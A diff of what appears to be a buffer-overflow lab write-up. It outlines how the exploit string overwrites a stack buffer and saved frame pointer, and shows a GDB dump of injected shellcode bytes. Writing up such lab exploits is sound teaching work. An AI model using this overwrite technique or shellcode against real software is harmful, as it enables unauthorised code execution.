@@ -29,7 +29,6 @@ Stack level 0, frame at 0xffffd6b0:
 
 Here is the stack diagram.
 
-
 The exploit has three parts:
 
 1. Write 20 dummy characters to overwrite `buf`, the compiler padding, and the sfp.
@@ -49,4 +48,3 @@ When we ran GDB after inputting the malicious exploit string, we got the followi
 0xffffd6b8:  0x58476ac1   0xc03180cd   0x692d6850   0xe2896969
 0xffffd6c8:  0x6d2b6850   0xe1896d6d   0x2f2f6850   0x2f686873
 ```
-
